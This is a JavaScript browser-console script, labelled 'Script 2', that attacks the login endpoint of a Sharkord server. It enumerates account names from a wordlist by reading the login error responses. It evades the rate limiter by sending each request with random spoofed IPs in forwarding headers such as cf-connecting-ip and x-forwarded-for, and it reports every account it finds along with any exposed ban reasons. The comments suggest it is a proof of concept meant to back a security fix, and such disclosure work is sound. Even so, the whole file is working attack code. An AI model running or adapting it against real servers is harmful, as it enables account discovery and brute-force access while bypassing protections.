(async () => {
    const CONFIG = {
        serverUrl: window.location.origin,

        password: "aaaaaaaa",

        requestsPerMinute: 20,

        durationMs: 10 * 60 * 1000,

        identities: ["admin", "administrator", "root", "i3", "sysadmin", "user", "usuario", "guest", "invitado", "anonymous", "test", "testing", "demo", "sandbox", "info", "support", "help", "contact", "hello", "mod", "moderator", "staff", "team", "bot", "system", "service", "api", "john", "jane", "alex", "chris", "david", "maria", "carlos", "sharkord", "owner", "dev", "developer"]
    };

    const DELAY_MS = Math.ceil(60_000 / CONFIG.requestsPerMinute);

    const randomSpoofedIp = () => {
        const safeFirstOctets = [...Array.from({ length: 9 }, (_, i) => i + 1), ...Array.from({ length: 16 }, (_, i) => i + 11), ...Array.from({ length: 100 }, (_, i) => i + 28), ...Array.from({ length: 38 }, (_, i) => i + 128), ...Array.from({ length: 2 }, (_, i) => i + 170), ...Array.from({ length: 43 }, (_, i) => i + 173)];
        const a = safeFirstOctets[Math.floor(Math.random() * safeFirstOctets.length)];
        const b = Math.floor(Math.random() * 254) + 1;
        const c = Math.floor(Math.random() * 254) + 1;
        const d = Math.floor(Math.random() * 254) + 1;
        return `${a}.${b}.${c}.${d}`;
    };

    const results = {
        found: [],
        notFound: [],
        errors429: 0,
        errors429List: [],
        errorsOther: [],
        rawLog: [],
        totalRequests: 0,
        startTime: Date.now()
    };

    const sleep = ms => new Promise(r => setTimeout(r, ms));

    const classify = (status, data) => {
        if (status === 429) return "429";
        if (!data?.errors) return "UNKNOWN";
        if (data.errors.password) return "EXISTS";
        if (data.errors.identity) {
            if (typeof data.errors.identity === "string" && data.errors.identity.startsWith("Identity banned")) {
                return "BANNED";
            }
            return "NOT_FOUND";
        }
        return "UNKNOWN";
    };

    console.log("%c[Script 2] Enumeration with rate limit bypass (header spoofing v2 — cf-connecting-ip)", "color: orange; font-weight: bold; font-size: 13px");
    console.log(`  Infrastructure: VPS Ubuntu → Nginx → Docker → Sharkord\n` + `  Nginx sets X-Real-IP=$remote_addr (real) and passes cf-connecting-ip untouched.\n` + `  Server:      ${CONFIG.serverUrl}\n` + `  Self-limit:  ${CONFIG.requestsPerMinute} req/min (4× the actual rate limit)\n` + `  Delay:       ${DELAY_MS} ms between requests\n` + `  Duration:    10 minutes\n` + `  Wordlist:    ${CONFIG.identities.length} identities\n` + `  Exploit:     cf-connecting-ip (highest priority, Nginx does not overwrite it)\n` + `  Estimate:    ~${Math.floor((10 * CONFIG.requestsPerMinute) / CONFIG.identities.length)} full passes`);

    console.log("%c\n[Probe] Sending 6 rapid requests to verify the exploit...", "color: #aaa; font-style: italic");
    {
        let probe429 = 0;
        for (let i = 0; i < 6; i++) {
            const probeIp = randomSpoofedIp();
            try {
                const r = await fetch(`${CONFIG.serverUrl}/login`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "cf-connecting-ip": probeIp,
                        "true-client-ip": probeIp,
                        "cf-real-ip": probeIp,
                        "x-real-ip": probeIp,
                        "x-client-ip": probeIp,
                        "x-cluster-client-ip": probeIp,
                        "x-forwarded-for": probeIp,
                        Forwarded: `for=${probeIp}`
                    },
                    body: JSON.stringify({ identity: "__probe__", password: CONFIG.password })
                });
                if (r.status === 429) probe429++;
                console.log(`  Probe ${i + 1}/6: HTTP ${r.status}  (spoof: ${probeIp})${r.status === 429 ? " ← 429!" : ""}`);
            } catch (e) {
                console.warn(`  Probe ${i + 1}/6: network error (${e.message})`);
            }
            // no delay between probes: we want to exceed the rate limit on purpose
        }

        if (probe429 === 0) {
            console.log("%c[Probe] ✅ 0 429 responses in 6 rapid requests → exploit ACTIVE.\n" + "  Nginx does not overwrite cf-connecting-ip. Starting 10-minute test.", "color: #00ff88; font-weight: bold");
        } else {
            console.warn(`%c[Probe] ❌ ${probe429}/6 429 responses → exploit NOT working.\n` + "  Nginx is overwriting or stripping the client IP headers.\n" + "  The rate limiter is working correctly on this deployment.\n" + '  Possible cause: proxy_set_header CF-Connecting-IP "" in nginx.conf.\n' + "  You can stop the script (Ctrl+C in console) or let it run to document.", "color: red; font-weight: bold");
        }
        console.log("");
    }

    const endTime = Date.now() + CONFIG.durationMs;
    let idx = 0;

    while (Date.now() < endTime) {
        const identity = CONFIG.identities[idx % CONFIG.identities.length];
        const spoofedIp = randomSpoofedIp();
        idx++;

        let status = null;
        let data = null;

        try {
            const res = await fetch(`${CONFIG.serverUrl}/login`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "cf-connecting-ip": spoofedIp,
                    "true-client-ip": spoofedIp,
                    "cf-real-ip": spoofedIp,
                    "x-real-ip": spoofedIp,
                    "x-client-ip": spoofedIp,
                    "x-cluster-client-ip": spoofedIp,
                    "x-forwarded-for": spoofedIp,
                    Forwarded: `for=${spoofedIp}`
                },
                body: JSON.stringify({ identity, password: CONFIG.password })
            });

            status = res.status;
            data = await res.json().catch(() => null);
        } catch (e) {
            results.errorsOther.push({ identity, spoofedIp, error: e.message });
            console.error(`[NET ERROR] ${identity} (spoof: ${spoofedIp}): ${e.message}`);
            await sleep(DELAY_MS);
            continue;
        }

        results.totalRequests++;
        const verdict = classify(status, data);
        const elapsed = ((Date.now() - results.startTime) / 1000).toFixed(0);

        results.rawLog.push({ identity, spoofedIp, status, verdict, elapsed: `${elapsed}s` });

        switch (verdict) {
            case "EXISTS":
                results.found.push(identity);
                console.log(`%c[FOUND]     ${identity}  (HTTP ${status}, spoof: ${spoofedIp})`, "color: #00ff88; font-weight: bold");
                break;

            case "BANNED": {
                results.found.push(identity);
                const banReason = data?.errors?.identity?.replace(/^Identity banned:\s*/i, "").trim() || "(no reason)";
                console.log(`%c[BANNED]    ${identity}  (HTTP ${status}, spoof: ${spoofedIp}) — exposed reason: "${banReason}"`, "color: #ffcc00; font-weight: bold");
                break;
            }

            case "NOT_FOUND":
                results.notFound.push(identity);
                console.log(`[NOT FOUND] ${identity}  (spoof: ${spoofedIp})`);
                break;

            case "429":
                results.errors429++;
                results.errors429List.push({ identity, spoofedIp, elapsed: `${elapsed}s` });
                console.warn(`%c[429] Rate limited! req #${results.totalRequests} — spoof IP: ${spoofedIp}`, "color: red; font-weight: bold");
                // no extra delay: if we get 429 with a different IP, there is another mechanism → worth documenting
                break;

            default:
                results.errorsOther.push({ identity, spoofedIp, status, data });
                console.warn(`[UNKNOWN]   ${identity}  HTTP ${status}`, data);
        }

        if (results.totalRequests % 20 === 0) {
            const remaining = Math.round((endTime - Date.now()) / 60_000);
            const exploitStatus = results.errors429 === 0 ? "✅ active" : `❌ ${results.errors429} blocked`;
            console.log(`%c[Progress] ${results.totalRequests} req | Found: ${results.found.length} | ` + `429s: ${results.errors429} | Exploit: ${exploitStatus} | ~${remaining} min remaining`, "color: #888");
        }

        await sleep(DELAY_MS);
    }

    const durationMin = ((Date.now() - results.startTime) / 60_000).toFixed(1);
    const pct429 = results.totalRequests > 0 ? ((results.errors429 / results.totalRequests) * 100).toFixed(2) : "0.00";

    const exploitVerdict = results.errors429 === 0 ? "✅ CONFIRMED — rate limiter 100% bypassed" : results.errors429 / results.totalRequests < 0.05 ? "⚠️  PARTIAL — rate limiter mostly evaded but not 100%" : "❌ NOT EFFECTIVE — rate limiter blocked a significant portion";

    console.log("%c\n══════════════════════════════════════════════════════\n" + "  FINAL RESULTS — Script 2 (rate limit bypass)\n" + "══════════════════════════════════════════════════════", "color: orange; font-weight: bold; font-size: 14px");

    console.table({
        "Total requests sent": results.totalRequests,
        "Identities FOUND": results.found.length,
        "Identities NOT found": results.notFound.length,
        "429 responses received": results.errors429,
        "% of 429 over total": `${pct429}%`,
        "Other errors": results.errorsOther.length,
        "Actual duration (min)": durationMin,
        "Exploit verdict": exploitVerdict
    });

    if (results.found.length > 0) {
        console.log("%cConfirmed identities:", "color: #00ff88; font-weight: bold", results.found);
    } else {
        console.log("%cNo valid identities found.", "color: #888");
    }

    console.log(`\n%cVerdict: ${exploitVerdict}`, "font-weight: bold; font-size: 13px");

    if (results.errors429 === 0) {
        console.log("%c→ 0 429 responses with distinct spoofed IPs.\n" + "  The rate limiter blindly trusts X-Forwarded-For.\n" + "  This confirms the exploit described in .docs/security-login-enumeration.md.", "color: orange");
    } else {
        console.log(`%c→ Received ${results.errors429} 429 responses with distinct spoofed IPs.\n` + "  There may be a proxy/CDN in front rewriting the header, or an additional rate limit.", "color: yellow");
        if (results.errors429List.length > 0) {
            console.log("429 details (evidence for the PR):", results.errors429List);
        }
    }

    const script1EstimatedRequests = Math.floor(durationMin * 4);
    const throughputMultiplier = (results.totalRequests / Math.max(script1EstimatedRequests, 1)).toFixed(2);
    console.log(`\n%c[Comparison] This script made ~${throughputMultiplier}× more requests than Script 1 ` + `(~${results.totalRequests} vs ~${script1EstimatedRequests} estimated in the same time).`, "color: #aaa");

    console.log("\nFull results available at: window.__enum2");
    window.__enum2 = results;
    return results;
})();
